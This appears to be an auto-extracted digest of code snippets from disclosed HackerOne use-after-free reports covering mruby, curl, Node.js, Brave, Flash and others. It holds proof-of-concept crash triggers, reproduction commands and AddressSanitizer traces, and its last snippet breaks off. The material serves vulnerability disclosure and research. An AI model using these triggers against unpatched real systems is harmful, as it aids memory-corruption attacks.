# Use-after-free — verbatim payloads/PoC snippets from disclosed HackerOne reports

Auto-extracted 2026-11-12 from `data/h1` (code blocks and raw HTTP requests in the reporter's own text). Top reports by bounty, then votes. Full context: the linked report file.

## #151043 Adobe Flash Player PSDK Class Use After Free Vulnerability — ibb — $5,000 — Memory Corruption - Generic
Source: `hackerone/reports/2019/151043.md` (https://hackerone.com/reports/151043)

```
            import com.adobe.tvsdk.mediacore.PSDK;  
            import flash.display.Sprite;    
           
            public class poc extends Sprite
            {
                        public function poc()
                        {
                                    var ps:PSDK = PSDK.pSDK;
                                    var ps_:PSDK = PSDK.pSDK;
                                    ps.release();
                                    ps_.currentTime;
                        }
            }
```

## #478367 efree() on uninitialized Heap data in imagescale leads to use-after-free — ibb — $1,500 — Use After Free
Source: `hackerone/reports/2020/478367.md` (https://hackerone.com/reports/478367)

```
if (overflow2(line_length, sizeof(ContributionType))) {
		gdFree(res);
		return NULL;
	}
	res->ContribRow = (ContributionType *) gdMalloc(line_length * sizeof(ContributionType));
	if (res->ContribRow == NULL) {
		gdFree(res);
		return NULL;
	}
	for (u = 0 ; u < line_length ; u++) {
		if (overflow2(windows_size, sizeof(double))) {
			overflow_error = 1;
		} else {
			res->ContribRow[u].Weights = (double *) gdMalloc(windows_size * sizeof(double));
		}
		if (overflow_error == 1 || res->ContribRow[u].Weights == NULL) {
			unsigned int i;
			u--;
			for (i=0;i<=u;i++) {
                gdFree(res->ContribRow[i].Weights);
			}
```

```
                gdFree(res->ContribRow[i].Weights);
```

## #172562 LZMADecompressor.decompress Use After Free — ibb — $1,500 — Memory Corruption - Generic
Source: `hackerone/reports/2016/172562.md` (https://hackerone.com/reports/172562)

```
    char input_buffer_in_use;
    PyObject *result;
    lzma_stream *lzs = &d->lzs;
```

```
    /* Prepend unconsumed input if necessary */
    if (lzs->next_in != NULL) {
        [...]
    }
    else {
        lzs->next_in = data;
        lzs->avail_in = len;
        input_buffer_in_use = 0;
    }
```

```
    result = decompress_buf(d, max_length);
    if(result == NULL)
        return NULL;
    [...]
```

## #109175 Use After Free in sortWithSortKeys() — ibb — $1,000 — Memory Corruption - Generic
Source: `hackerone/reports/2016/109175.md` (https://hackerone.com/reports/109175)

```
    stack_end=0x7fffffffe318) at libc-start.c:287
```

## #193143 Use After Free in str_replace — shopify-scripts — $800 — Memory Corruption - Generic
Source: `hackerone/reports/2017/193143.md` (https://hackerone.com/reports/193143)

```
$a = "A"*50
$a.replace($a)
$b = "B"*50
puts $a
```

```
$ ./bin/mruby test6.rb
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
```

## #213261 Use-after-free leading to an invalid pointer dereference — shopify-scripts — $800 — Uncontrolled Resource Consumption
Source: `hackerone/reports/2017/213261.md` (https://hackerone.com/reports/213261)

```
    class A < def to_str
      ""[1, 2, 3]
      ensure --> {} rescue
      Struct.new.new.to_h
      end
    end
```

```
    1689│       L_RESCUE:
    1690│         if (ci->ridx == 0) goto L_STOP;
    1691│         proc = ci->proc;
    1692├>        irep = proc->body.irep;
```

```
    50├>    return mrb_obj_ptr(v)->c;
    51│   }
    52│ }
```

## #295276 heap-use-after-free in OP_RESCUE — shopify-scripts — $800 — Use After Free
Source: `hackerone/reports/2018/295276.md` (https://hackerone.com/reports/295276)

```
def e
	proc
ensure z rescue 
	yield 
end

e { 
	Class * def * x
	new { 
		Class * 0
	} 
	ensure 0[] = 00end rescue 
	0
} rescue
z
```

```
./mruby/bin/mruby out.rb
=================================================================
==10040==ERROR: AddressSanitizer: heap-use-after-free on address 0x61d000001ec0 at pc 0x00010366ff4a bp 0x7ffeec9d44b0 sp 0x7ffeec9d3c60
WRITE of size 16 at 0x61d000001ec0 thread T0
    #0 0x10366ff49 in __asan_memcpy (libclang_rt.asan_osx_dynamic.dylib:x86_64h+0x50f49)
    #1 0x1032c6b9c in mrb_vm_exec vm.c:1292
    #2 0x1032bf1b4 in mrb_vm_run vm.c:930
    #3 0x1032f5f5c in mrb_top_run vm.c:2964
    #4 0x1034b4ac0 in mrb_load_exec parse.y:5840
    #5 0x1034b58e5 in mrb_load_file_cxt parse.y:5849
    #6 0x10322486c in main mruby.c:227
    #7 0x7fff7ab3e144 in start (libdyld.dylib:x86_64+0x1144)

0x61d000001ec0 is located 64 bytes inside of 2048-byte region [0x61d000001e80,0x61d000002680)
freed by thread T0 here:
    #0 0x1036782d0 in wrap_realloc (libclang_rt.asan_osx_dynamic.dylib:x86_64h+0x592d0)
    #1 0x1032ab6f5 in mrb_default_allocf state.c:55
    #2 0x1033bf138 in mrb_realloc_simple gc.c:206
    #3 0x1033bf8fa in mrb_realloc gc.c:220
    #4 0x1032f6a04 in stack_extend_alloc vm.c:186
    #5 0x1032b4def in stack_extend vm.c:207
    #6 0x1032bbb30 in mrb_yield_with_class vm.c:730
    #7 0x103274355 in mrb_class_initialize class.c:1613
    #8 0x1032b2fc2 in mrb_funcall_with_block vm.c:481
    #9 0x10327372a in mrb_class_new_class class.c:1633
    #10 0x1032cb789 in mrb_vm_exec vm.c:1456
    #11 0x1032bf1b4 in mrb_vm_run vm.c:930
    #12 0x1032b59d4 in mrb_run vm.c:2950
    #13 0x103
```

```
    #0 0x10366ff49 in __asan_memcpy (libclang_rt.asan_osx_dynamic.dylib:x86_64h+0x50f49)
    #1 0x1032c6b9c in mrb_vm_exec vm.c:1292
    #2 0x1032bf1b4 in mrb_vm_run vm.c:930
    #3 0x1032f5f5c in mrb_top_run vm.c:2964
    #4 0x1034b4ac0 in mrb_load_exec parse.y:5840
    #5 0x1034b58e5 in mrb_load_file_cxt parse.y:5849
    #6 0x10322486c in main mruby.c:227
    #7 0x7fff7ab3e144 in start (libdyld.dylib:x86_64+0x1144)
```

## #222294 heap-use-after-free in mrb_vm_exec - vm.c:1247 — shopify-scripts — $800 — Memory Corruption - Generic
Source: `hackerone/reports/2017/222294.md` (https://hackerone.com/reports/222294)

```
g=0.times.p{}
a %w{0 0 0 0 0 0 0 0 0 0
0 0 0 0
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
0 0 0 0 0
0 0 0 0 0 0 0 0 0 0 0
0 0 0 0 0 0 0
0 0 0 0 0
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
0 { 0 } 0 0 0 0 0 0 0 0 0
0 0 0
0 0 0 0
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 } 0}.(&:e)
```

```
==3480==ERROR: AddressSanitizer: heap-use-after-free on address 0x61d00001e0c0 at pc 0x0000004385b1 bp 0x7ffd93156930 sp 0x7ffd9315692
8                                                                
WRITE of size 8 at 0x61d00001e0c0 thread T0                         
    #0 0x4385b0 in mrb_vm_exec /tmp/mruby/src/vm.c:1247
    #1 0x4407f9 in mrb_vm_run /tmp/mruby/src/vm.c:854
    #2 0x4407f9 in mrb_top_run /tmp/mruby/src/vm.c:2705
    #3 0x58652d in mrb_load_exec /tmp/mruby/mrbgems/mruby-compiler/core/parse.y:
5780                         
    #4 0x403bbe in main /tmp/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:2
47                           
    #5 0x7f52c49752b0 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x202b0)
    #6 0x402e19 in _start (/home/debian/work/fuzz/mruby/fuzz/20170419/mruby+0x402e19)
                             
0x61d00001e0c0 is located 64 bytes inside of 2048-byte region [0x61d00001e080,0x61d00001e880)
freed by thread T0 here:     
    #0 0x7f52c5753090 in realloc (/usr/lib/x86_64-linux-gnu/libasan.so.3+0xc2090)
    #1 0x4d3ee0 in mrb_realloc_simple /tmp/mruby/src/gc.c:202
    #2 0x4d3ee0 in mrb_realloc /tmp/mruby/src/gc.c:216
                             
previously allocated by thread T0 here:
    #0 0x7f52c5753090 in realloc (/usr/lib/x86_64-linux-gnu/libasan.so.3+0xc2090)
    #1 0x4d3ee0 in mrb_realloc_simple /tmp/mruby/src/gc.c:202
    #2 0x4d3ee0 in mrb_realloc /tmp/mruby/src/gc.c:216

SUMMARY: AddressSanitizer: heap-use-after-free /
```

```
    #0 0x4385b0 in mrb_vm_exec /tmp/mruby/src/vm.c:1247
    #1 0x4407f9 in mrb_vm_run /tmp/mruby/src/vm.c:854
    #2 0x4407f9 in mrb_top_run /tmp/mruby/src/vm.c:2705
    #3 0x58652d in mrb_load_exec /tmp/mruby/mrbgems/mruby-compiler/core/parse.y:
```

## #244904 Use after free in mruby-mpdecimal — shopify-scripts — $800 — Use After Free
Source: `hackerone/reports/2017/244904.md` (https://hackerone.com/reports/244904)

```
x=inspect.to_d-0
```

```
$ ./ext/enterprise_script_service/mruby/bin/mruby crash.rb
trace:
	[0] crash.rb:1
	[1] /root/ess/ext/enterprise_script_service/mruby-mpdecimal/mrblib/mpdecimal.rb:21:in to_d
/root/ess/ext/enterprise_script_service/mruby-mpdecimal/mrblib/mpdecimal.rb:21:can't convert "main" into Decimal (ArgumentError)
=================================================================
==8219==ERROR: AddressSanitizer: heap-use-after-free on address 0x60800000b9f0 at pc 0x00000073de47 bp 0x7ffc2a5efa90 sp 0x7ffc2a5efa88
READ of size 8 at 0x60800000b9f0 thread T0
    #0 0x73de46 in mpd_free /root/ess/ext/enterprise_script_service/mruby-mpdecimal/src/memory.c:139:5
    #1 0x6e0c15 in mpd_del /root/ess/ext/enterprise_script_service/mruby-mpdecimal/src/mpdecimal.c:459:9
    #2 0x6ddb62 in decimal_free /root/ess/ext/enterprise_script_service/mruby-mpdecimal/src/ext.c:28:3
    #3 0x536973 in obj_free /root/ess/ext/enterprise_script_service/mruby/src/gc.c:823:9
    #4 0x537055 in free_heap /root/ess/ext/enterprise_script_service/mruby/src/gc.c:388:9
    #5 0x537055 in mrb_gc_destroy /root/ess/ext/enterprise_script_service/mruby/src/gc.c:397
    #6 0x531d3d in mrb_close /root/ess/ext/enterprise_script_service/mruby/src/state.c:252:3
    #7 0x4e6c39 in cleanup /root/ess/ext/enterprise_script_service/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:165:3
    #8 0x4e6c39 in main /root/ess/ext/enterprise_script_service/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:257
    #9 0x7f2e96bdaf44 in __libc_sta
```

```
 39779b339e12c81d2fd9dcc5d0a9c40bed965430 ext/enterprise_script_service/mruby (1.0.0-4080-g39779b3)
 
```

## #194884 Heap use-after-free during range creation — shopify-scripts — $200 — Memory Corruption - Generic
Source: `hackerone/reports/2017/194884.md` (https://hackerone.com/reports/194884)

```
[][0,0]..[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]
```

```
==30925==ERROR: AddressSanitizer: heap-use-after-free on address 0x61d00001e090 at pc 0x0000004ae8ac bp 0x7ffc0a539cd0 sp 0x7ffc0a539480
WRITE of size 16 at 0x61d00001e090 thread T0
    #0 0x4ae8ab in __asan_memcpy (/vagrant/bin/mruby+0x4ae8ab)
    #1 0x646186 in mrb_vm_exec /vagrant/src/vm.c:2414:27
    #2 0x61e2eb in mrb_vm_run /vagrant/src/vm.c:772:10
    #3 0x64a628 in mrb_top_run /vagrant/src/vm.c:2490:12
    #4 0x674229 in mrb_load_exec /vagrant/mrbgems/mruby-compiler/core/parse.y:5755:7
    #5 0x674ec5 in mrb_load_file_cxt /vagrant/mrbgems/mruby-compiler/core/parse.y:5764:10
    #6 0x4f3af5 in main /vagrant/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232:11
    #7 0x7facbbfc1f44 in __libc_start_main /build/eglibc-oGUzwX/eglibc-2.19/csu/libc-start.c:287
    #8 0x41a505 in _start (/vagrant/bin/mruby+0x41a505)

0x61d00001e090 is located 16 bytes inside of 2048-byte region [0x61d00001e080,0x61d00001e880)
freed by thread T0 here:
    #0 0x4c4c0d in realloc (/vagrant/bin/mruby+0x4c4c0d)
    #1 0x5bfde5 in mrb_default_allocf /vagrant/src/state.c:60:12
    #2 0x550396 in mrb_realloc_simple /vagrant/src/gc.c:201:8
    #3 0x5509e4 in mrb_realloc /vagrant/src/gc.c:215:8
    #4 0x64ade2 in stack_extend_alloc /vagrant/src/vm.c:155:33
    #5 0x617db1 in stack_extend /vagrant/src/vm.c:172:5
    #6 0x61591f in mrb_funcall_with_block /vagrant/src/vm.c:394:7
    #7 0x613c3c in mrb_funcall_argv /vagrant/src/vm.c:432:10
    #8 0x613745 in mrb_funcall /vagrant/src/vm.c:323:10
    #9 0x5b56
```

```
From ec7d6b4078f25bcc7c25b210e2d69c910ea9b923 Mon Sep 17 00:00:00 2001
From: Jonathan Rudenberg <jonathan@titanous.com>
Date: Fri, 30 Dec 2016 17:44:25 -0500
Subject: [PATCH] Fix heap use-after-free during range creation

---
 src/vm.c | 3 ++-
 1 file changed, 2 insertions(+), 1 deletion(-)

diff --git a/src/vm.c b/src/vm.c
index cca0fd03..368b75a9 100644
--- a/src/vm.c
+++ b/src/vm.c
@@ -2411,7 +2411,8 @@ RETRY_TRY_BLOCK:
     CASE(OP_RANGE) {
       /* A B C  R(A) := range_new(R(B),R(B+1),C) */
       int b = GETARG_B(i);
-      regs[GETARG_A(i)] = mrb_range_new(mrb, regs[b], regs[b+1], GETARG_C(i));
+      mrb_value res = mrb_range_new(mrb, regs[b], regs[b+1], GETARG_C(i));
+      regs[GETARG_A(i)] = res;
       ARENA_RESTORE(mrb, ai);
       NEXT;
     }
-- 
2.11.0
```

## #200821  heap-use-after-free /home/operac/testafl/mruby/mrubylast/mruby/src/gc.c — shopify-scripts — $100 — Memory Corruption - Generic
Source: `hackerone/reports/2017/200821.md` (https://hackerone.com/reports/200821)

```
va0ue0=[0,0,0,0]
u=[]
h=[]
va0ue0.each do va0ue0.uniq!do
va0ue0.zip va0ue0.each do v do%  end end end
end
```

```
operac@hp2:~/testafl/mruby/mrubylast/mruby/bin$ ./mruby 07.min.rb
=================================================================
==7623==ERROR: AddressSanitizer: heap-use-after-free on address 0x62f00001a3d0 at pc 0x0000004eb2bd bp 0x7ffc645dd890 sp 0x7ffc645dd880
READ of size 4 at 0x62f00001a3d0 thread T0
    #0 0x4eb2bc in obj_free /home/operac/testafl/mruby/mrubylast/mruby/src/gc.c:762
    #1 0x4eb2bc in free_heap /home/operac/testafl/mruby/mrubylast/mruby/src/gc.c:384
    #2 0x4eb2bc in mrb_gc_destroy /home/operac/testafl/mruby/mrubylast/mruby/src/gc.c:393
    #3 0x519205 in mrb_close /home/operac/testafl/mruby/mrubylast/mruby/src/state.c:251
    #4 0x405a47 in main /home/operac/testafl/mruby/mrubylast/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:256
    #5 0x7f57ed98a82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)
    #6 0x4081f8 in _start (/home/operac/testafl/mruby/mrubylast/mruby/bin/mruby+0x4081f8)

0x62f00001a3d0 is located 49104 bytes inside of 49200-byte region [0x62f00000e400,0x62f00001a430)
freed by thread T0 here:

    #0 0x7f57ee0d4961 in realloc (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x98961)
    #1 0x4ed908 in mrb_realloc_simple /home/operac/testafl/mruby/mrubylast/mruby/src/gc.c:201
    #2 0x4ed908 in mrb_realloc /home/operac/testafl/mruby/mrubylast/mruby/src/gc.c:215
    #3 0x4ee5f2 in mrb_malloc /home/operac/testafl/mruby/mrubylast/mruby/src/gc.c:236
    #4 0x4ee5f2 in mrb_calloc /home/operac/testafl/mruby/mrubylast/mruby/src/g
```

```
    #0 0x4eb2bc in obj_free /home/operac/testafl/mruby/mrubylast/mruby/src/gc.c:762
    #1 0x4eb2bc in free_heap /home/operac/testafl/mruby/mrubylast/mruby/src/gc.c:384
    #2 0x4eb2bc in mrb_gc_destroy /home/operac/testafl/mruby/mrubylast/mruby/src/gc.c:393
    #3 0x519205 in mrb_close /home/operac/testafl/mruby/mrubylast/mruby/src/state.c:251
    #4 0x405a47 in main /home/operac/testafl/mruby/mrubylast/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:256
    #5 0x7f57ed98a82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)
    #6 0x4081f8 in _start (/home/operac/testafl/mruby/mrubylast/mruby/bin/mruby+0x4081f8)
```

## #1180380 CVE-2021-22901: TLS session caching disaster — curl — - — Use After Free
Source: `hackerone/reports/2021/1180380.md` (https://hackerone.com/reports/1180380)

```
  SSL_CTX_set_session_cache_mode(backend->ctx,
      SSL_SESS_CACHE_CLIENT | SSL_SESS_CACHE_NO_INTERNAL);
  SSL_CTX_sess_set_new_cb(backend->ctx, ossl_new_session_cb);
```

```
      SSL_set_ex_data(backend->handle, data_idx, data);
      SSL_set_ex_data(backend->handle, connectdata_idx, conn);
```

```
  conn = (struct connectdata*) SSL_get_ex_data(ssl, connectdata_idx);
  if(!conn)
    return 0;

  data = (struct Curl_easy *) SSL_get_ex_data(ssl, data_idx);
```

## #3591956 Use-After-Free in SMB connection reuse (req->path dangling pointer after needle destruction) — curl — - — Use After Free
Source: `hackerone/reports/2026/3591956.md` (https://hackerone.com/reports/3591956)

```
git clone https://github.com/curl/curl.git && cd curl
autoreconf -fi
./configure --with-openssl --enable-smb --without-libpsl
make CFLAGS="-fsanitize=address -g -O0 -fno-omit-frame-pointer" LDFLAGS="-fsanitize=address" -j$(nproc)
```

```
python3 fake_smb_server.py 5445
```

```
ASAN_OPTIONS=detect_leaks=0 LD_LIBRARY_PATH=./lib/.libs \
./src/.libs/curl -u guest:guest \
  "smb://127.0.0.1:5445/share1/file1" -o /dev/null \
  "smb://127.0.0.1:5445/share2/file2" -o /dev/null
```

## #1977252 UAF on JSEthereumProvider — brave — - — Use After Free
Source: `hackerone/reports/2023/1977252.md` (https://hackerone.com/reports/1977252)

```
// 1. Create a new handle to JSEthereumProvider and convert it to a v8::Object
gin::Handle<JSEthereumProvider> provider =
    gin::CreateHandle(isolate, new JSEthereumProvider(render_frame));
if (provider.IsEmpty()) {
  return;
}
v8::Local<v8::Value> provider_value = provider.ToV8();
v8::Local<v8::Object> provider_object =
    provider_value->ToObject(context).ToLocalChecked();

// 2. Create a v8::Proxy for the provider
if (!v8::Proxy::New(context, provider_object, ethereum_proxy_handler_obj)
         .ToLocal(&ethereum_proxy)) {
  // Error handling
}

// 3. Expose it through window.ethereum
global
    ->Set(context, gin::StringToSymbol(isolate, kEthereum), ethereum_proxy)
    .Check();

// 4. Create a new v8::Object and make it accessible through ethereum._metamask
v8::Local<v8::Object> metamask_obj = v8::Object::New(isolate);
provider_object
    ->Set(context, gin::StringToSymbol(isolate, kMetaMask), metamask_obj)
    .Check();

// 5. [BUG] Set a new property called `IsUnlocked`, creating a new callback object bound to `base::Unretained(provider.get())`, making the wrong assumption that ethereum._metamask can never outlive ethereum
provider_object
    ->Set(context, gin::StringToSymbol(isolate, kIsUnlocked),
          gin::CreateFunctionTemplate(
              isolate, base::BindRepeating(&JSEthereumProvider::IsUnlocked,
                                           base::Unretained(provider.get())))
              ->GetFunction(context)
              .ToLocalChecked())
    .Ch
```

```
function triggerGC() {
  for (let i = 0; i < 100; i++) {
    let a = new Array(1000000);
  }
}

let uafObj = ethereum._metamask;
delete ethereum;
triggerGC();
console.log(await uafObj.isUnlocked());
```

```
    gin::CreateHandle(isolate, new JSEthereumProvider(render_frame));
```

## #3591944 CVE-2026-3805: use after free in SMB connection reuse — curl — - — Use After Free
Source: `hackerone/reports/2026/3591944.md` (https://hackerone.com/reports/3591944)

```
    git clone https://github.com/curl/curl.git && cd curl
    autoreconf -fi
    ./configure --with-openssl --enable-smb --without-libpsl
    make CFLAGS="-fsanitize=address -g -O0 -fno-omit-frame-pointer" LDFLAGS="-fsanitize=address" -j$(nproc)
```

```
    ASAN_OPTIONS=detect_leaks=0 LD_LIBRARY_PATH=./lib/.libs \
    ./src/.libs/curl -u guest:guest \
      "smb://127.0.0.1:5445/share1/file1" -o /dev/null \
      "smb://127.0.0.1:5445/share2/file2" -o /dev/null
```

## #3242005 Use-After-Free in OpenSSL Keylog Callback via SSL_get_ex_data() in libcurl — curl — - — Use After Free
Source: `hackerone/reports/2025/3242005.md` (https://hackerone.com/reports/3242005)

```
    printf("Keylog callback: %s\n", line);
    // UAF: SSL already freed
    void *ptr = SSL_get_ex_data((SSL *)ssl, 0);  // cast to remove const
    printf("Data: %p\n", ptr);
```

```
    SSL_library_init();
    SSL_load_error_strings();
```

```
    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    SSL_CTX_set_keylog_callback(ctx, my_keylog_cb);
```

## #3283232 Use After Free (that leads to arbitrary Write for some versions)  — curl — - — Use After Free
Source: `hackerone/reports/2025/3283232.md` (https://hackerone.com/reports/3283232)

```
    CFLAGS="-fsanitize=address,undefined -g -O0 -fno-omit-frame-pointer" ./configure --with-openssl 
    
    make all -j$(nproc)  &&  sudo make install 
    
    curl --version

>> while true; do curl --url "c071993_domain22.com/image[0-10]tp.com/dir[0-10]/api/path[0-10]/api" -Zs --max-time 0.01; echo $?; done
28
28
28
134
=================================================================
==405371==ERROR: AddressSanitizer: heap-use-after-free on address 0x522000306eb0 at pc 0x7fb7ad920768 bp 0x7ffe25f15920 sp 0x7ffe25f15918
READ of size 16 at 0x522000306eb0 thread T0
```

```
while true; do 
    crash_=$(ASAN_OPTIONS="abort_on_error=1" curl --url "c071993_domain22.com/image[0-10]tp.com/dir[0-10]/api/path[0-10]/api" -Zs --max-time 0.01 2>&1)
    error_code=$?; echo $error_code
    if [ "$error_code" -eq 134 ]; then
      echo "$crash_"
      break
    fi
done
```

```
   // ---------------- Begin conf.txt -----------------------------
        --url "c071993_domain22.com/image[0-10]tp.com/dir[0-10]/api/path[0-10]/api"
        -Zs
        --max-time 0.01

    // ----------------END conf.txt -----------------------------
```

## #4064040  Use-after-free read of the freed referer buffer in `curl_easy_setopt(CURLOPT_REFERER)` — stale heap bytes transmitted in an outbound `Referer:` heade — curl — - — Information Disclosure
Source: `hackerone/reports/2026/4064040.md` (https://hackerone.com/reports/4064040)

```
/* ff300ac4aa (vulnerable): free BEFORE read */
case CURLOPT_REFERER:
    Curl_bufref_free(&data->state.referer);              /* frees */
    result = Curl_setstropt(&s->str[STRING_SET_REFERER], ptr);  /* strlen(ptr) → UAF */
    break;
```

```
   char *ref = NULL;
   curl_easy_getinfo(curl, CURLINFO_REFERER, &ref);   /* pointer into state.referer */
   curl_easy_setopt(curl, CURLOPT_REFERER, ref);      /* frees it, then strlen reads it */
   
```

```
    Curl_bufref_free(&data->state.referer);              /* frees */
    result = Curl_setstropt(&s->str[STRING_SET_REFERER], ptr);  /* strlen(ptr) → UAF */
    break;
```

## #3279804 Stack use-after-scope in HTTP/3 POST request processing via CURLOPT_POSTFIELDS — curl — - — Use After Free
Source: `hackerone/reports/2025/3279804.md` (https://hackerone.com/reports/3279804)

```
  export CC=clang
  export CFLAGS="-O1 -g -fsanitize=address,undefined"
  ./configure --with-openssl --with-nghttp2 --with-nghttp3 --with-ngtcp2
  make
```

```
  // http3_crash_poc.c
  #include <curl/curl.h>
  #include <string.h>

  int main() {
      CURL *curl = curl_easy_init();

      // Stack-allocated buffer that goes out of scope
      {
          char body_data[257];
          memset(body_data, 'A', 256);
          body_data[256] = '\0';

          curl_easy_setopt(curl, CURLOPT_URL, "https://example.com/");
          curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_3);
          curl_easy_setopt(curl, CURLOPT_POST, 1L);
          curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body_data); // Vulnerable call
          curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, 50L);
      } // body_data goes out of scope here

      // libcurl accesses invalid memory during transfer
      curl_easy_perform(curl);
      curl_easy_cleanup(curl);
      return 0;
  }
```

```
  clang -fsanitize=address http3_crash_poc.c -lcurl -o poc
  ./poc
```

## #988103 Node.js: use-after-free in TLSWrap — nodejs — - — Use After Free
Source: `hackerone/reports/2021/988103.md` (https://hackerone.com/reports/988103)

```
const https = require('https');

const key = `-----BEGIN EC PARAMETERS-----
BggqhkjOPQMBBw==
-----END EC PARAMETERS-----
-----BEGIN EC PRIVATE KEY-----
MHcCAQEEIDKfHHbiJMdu2STyHL11fWC7psMY19/gUNpsUpkwgGACoAoGCCqGSM49
AwEHoUQDQgAEItqm+pYj3Ca8bi5mBs+H8xSMxuW2JNn4I+kw3aREsetLk8pn3o81
PWBiTdSZrGBGQSy+UAlQvYeE6Z/QXQk8aw==
-----END EC PRIVATE KEY-----`

const cert = `-----BEGIN CERTIFICATE-----
MIIBhjCCASsCFDJU1tCo88NYU//pE+DQKO9hUDsFMAoGCCqGSM49BAMCMEUxCzAJ
BgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5l
dCBXaWRnaXRzIFB0eSBMdGQwHhcNMjAwOTIyMDg1NDU5WhcNNDgwMjA3MDg1NDU5
WjBFMQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwY
SW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcD
QgAEItqm+pYj3Ca8bi5mBs+H8xSMxuW2JNn4I+kw3aREsetLk8pn3o81PWBiTdSZ
rGBGQSy+UAlQvYeE6Z/QXQk8azAKBggqhkjOPQQDAgNJADBGAiEA7Bdn4F87KqIe
Y/ABy/XIXXpFUb2nyv3zV7POQi2lPcECIQC3UWLmfiedpiIKsf9YRIyO0uEood7+
glj2R1NNr1X68w==
-----END CERTIFICATE-----`

const options = {
  key: key,
  cert: cert,
};

https.createServer(options, function (req, res) {
  res.writeHead(200);
  res.end("hello world\n");
}).listen(4444);
```

```
const tls = require('tls')

var socket = tls.connect(4444, 'localhost', {rejectUnauthorized : false}, () => {
  console.log("connected")
  socket.write("GET / HTTP/1.1\r\nHost: localhost\r\nConnection: Keep-alive\r\n\r\n")
  socket.write("GET / HTTP/1.1\r\nHost: localhost\r\nConnection: Keep-alive\r\n\r\n")
  socket.write("GET / HTTP/1.1\r\nHost: localhost\r\nConnection: Keep-alive\r\n\r\n")
})


socket.on('data', () => {
  socket.destroy()
})  
```

```
==1408671==ERROR: AddressSanitizer: heap-use-after-free on address 0x608000011138 at pc 0x0000011929b6 bp 0x7ffc8c2243f0 sp 0x7ffc8c2243e8
READ of size 8 at 0x608000011138 thread T0
    #0 0x11929b5 in std::__uniq_ptr_impl<v8::BackingStore, std::default_delete<v8::BackingStore> >::_M_ptr() const /usr/bin/../lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/unique_ptr.h:154:42
    #1 0x1192974 in std::unique_ptr<v8::BackingStore, std::default_delete<v8::BackingStore> >::get() const /usr/bin/../lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/unique_ptr.h:361:21
    #2 0x1193fb4 in std::unique_ptr<v8::BackingStore, std::default_delete<v8::BackingStore> >::operator bool() const /usr/bin/../lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/unique_ptr.h:375:16
    #3 0x1190415 in node::AllocatedBuffer::data() /pwd/out/../src/allocated_buffer-inl.h:79:8
    #4 0x16f8a79 in node::WriteWrap::SetAllocatedStorage(node::AllocatedBuffer&&) /pwd/out/../src/stream_base-inl.h:247:3
    #5 0x16f1141 in node::StreamBase::Writev(v8::FunctionCallbackInfo<v8::Value> const&) /pwd/out/../src/stream_base.cc:172:15
    #6 0x16faa47 in void node::StreamBase::JSMethod<&(node::StreamBase::Writev(v8::FunctionCallbackInfo<v8::Value> const&))>(v8::FunctionCallbackInfo<v8::Value> const&) /pwd/out/../src/stream_base.cc:468:29
    #7 0x1caf642 in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo) /pwd/out/../deps/v8/src/api/api-arguments-inl.h:158:3
    #8 0
```

## #3022041 Use after free (read) in curl_multi_perform with DoH and Proxy options, and resolve timeouts — curl — - — Use After Free
Source: `hackerone/reports/2025/3022041.md` (https://hackerone.com/reports/3022041)

```
curl 8.13.0-DEV (x86_64-apple-darwin23.6.0) libcurl/8.13.0-DEV OpenSSL/1.0.2n zlib/1.2.11 libidn2/2.0.4 libpsl/0.19.1 nghttp2/1.55.1 librtmp/2.3
Release-Date: [unreleased]
Protocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns ldap ldaps mqtt pop3 pop3s rtmp rtsp smb smbs smtp smtps telnet tftp ws wss
Features: alt-svc AsynchDNS HSTS HTTP2 HTTPS-proxy IDN IPv6 Largefile libz NTLM PSL SSL threadsafe TLS-SRP UnixSockets
```

```
#include <stdio.h>
#include <curl/curl.h>

int main(void)
{
  CURL *curl;
  int still_running;

  curl = curl_easy_init();
  if(curl) {
    CURLM *multi_handle = curl_multi_init();
    curl_multi_add_handle(multi_handle, curl);
    curl_easy_setopt(curl, CURLOPT_DOH_URL, "doh");
    curl_easy_setopt(curl, CURLOPT_PROXY, "proxy");
    curl_easy_setopt(curl, CURLOPT_URL, "tftp://curl.se/");
    curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, 50L);
    curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
    curl_easy_setopt(curl, CURLOPT_SERVER_RESPONSE_TIMEOUT, 1L);
    curl_easy_setopt(curl, CURLOPT_PROTOCOLS_STR, "tftp");

    curl_multi_perform(multi_handle, &still_running);
      while (still_running > 0) {
          printf("still_running %d\n", still_running);
